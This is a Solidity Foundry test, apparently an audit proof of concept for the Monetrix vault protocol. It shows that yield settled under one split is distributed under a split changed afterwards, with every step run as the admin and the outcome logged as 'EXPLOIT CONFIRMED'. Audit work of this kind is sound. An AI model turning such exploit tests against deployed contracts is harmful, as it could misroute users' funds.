// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/InsuranceFund.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";

// ATTACK TIMELINE:
// 1. [Setup] Harness deploys full protocol, fund accounts
// 2. [T=0] Set initial yield BPS: user=8000, insurance=1000, foundation=1000
// 3. [T=1] User deposits 100_000e6 USDC and stakes 1_000e6 to sUSDM
// 4. [T=2] Mint 1_000e6 USDC to yieldEscrow as distributable yield
// 5. [T=3] Operator calls vault.settle(1_000e6) - records yield under OLD ratios
// 6. [T=4] Governance executes setYieldBps(5000, 4000) - changes to NEW ratios
// 7. [T=5] Operator calls vault.distributeYield() - distributes using NEW ratios
// 8. [Assert] Insurance receives 400e6 instead of 100e6 (4x more than settled ratio)

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // Step 2: Set initial yield BPS ratios
        // user=8000bps (80%), insurance=1000bps (10%), foundation=1000bps (10%)
        vm.prank(admin);
        config.setYieldBps(8000, 1000);

        console.log("Step 2: Initial ratios set - user=8000, insurance=1000, foundation=1000");
        console.log("userYieldBps =", config.userYieldBps());
        console.log("insuranceYieldBps =", config.insuranceYieldBps());

        // Step 3: User deposits and stakes
        _depositAs(user1, 100_000e6);
        _stakeAs(user1, 1_000e6);

        console.log("Step 3: User deposited and staked");

        // Step 4: Mint yield to yieldEscrow
        uint256 yieldAmount = 1_000e6;
        usdc.mint(address(yieldEscrow), yieldAmount);

        console.log("Step 4: Yield minted to escrow =", yieldAmount);
        console.log("yieldEscrow balance =", usdc.balanceOf(address(yieldEscrow)));

        // Step 5: Operator settles with OLD ratios
        // This records 1000e6 as distributable under 80/10/10 split
        vm.prank(admin);
        vault.settle(yieldAmount);

        console.log("Step 5: Settlement completed under OLD ratios");

        // Calculate expected insurance amount under OLD ratios
        uint256 expectedInsuranceOld = (yieldAmount * 1000) / 10000; // 100e6
        console.log("Expected insurance under OLD ratios =", expectedInsuranceOld);

        // Step 6: Governance changes yield BPS (simulating timelock execution)
        // NEW ratios: user=5000bps (50%), insurance=4000bps (40%), foundation=1000bps (10%)
        vm.prank(admin);
        config.setYieldBps(5000, 4000);

        console.log("Step 6: Ratios changed - user=5000, insurance=4000, foundation=1000");
        console.log("userYieldBps =", config.userYieldBps());
        console.log("insuranceYieldBps =", config.insuranceYieldBps());

        // Record insurance balance before distribution
        uint256 insuranceBalanceBefore = usdc.balanceOf(address(insurance));
        console.log("Insurance balance before distribution =", insuranceBalanceBefore);

        // Step 7: Operator distributes yield using NEW ratios
        vm.prank(admin);
        vault.distributeYield();

        console.log("Step 7: Distribution completed under NEW ratios");

        // Step 8: Assert the exploit
        uint256 insuranceBalanceAfter = usdc.balanceOf(address(insurance));
        uint256 insuranceReceived = insuranceBalanceAfter - insuranceBalanceBefore;

        console.log("Insurance balance after distribution =", insuranceBalanceAfter);
        console.log("Insurance received =", insuranceReceived);

        // Calculate expected insurance amount under NEW ratios
        uint256 expectedInsuranceNew = (yieldAmount * 4000) / 10000; // 400e6
        console.log("Expected insurance under NEW ratios =", expectedInsuranceNew);

        // The bug: insurance received 400e6 (based on NEW ratios)
        // but settlement was done under OLD ratios where insurance should get 100e6
        // This means insurance got 4x more than what was accounted for in settlement

        assertGt(
            insuranceReceived,
            expectedInsuranceOld,
            "Insurance received more than settled amount - timing gap exploited"
        );

        assertEq(
            insuranceReceived,
            expectedInsuranceNew,
            "Insurance received amount based on NEW ratios, not OLD settlement ratios"
        );

        // Additional assertion: insurance got 4x more than it should have under settlement ratios
        assertEq(
            insuranceReceived,
            expectedInsuranceOld * 4,
            "Insurance received exactly 4x the settled amount due to ratio change"
        );

        console.log("EXPLOIT CONFIRMED: Insurance received", insuranceReceived, "instead of", expectedInsuranceOld);
        console.log("Excess received =", insuranceReceived - expectedInsuranceOld);
    }
}
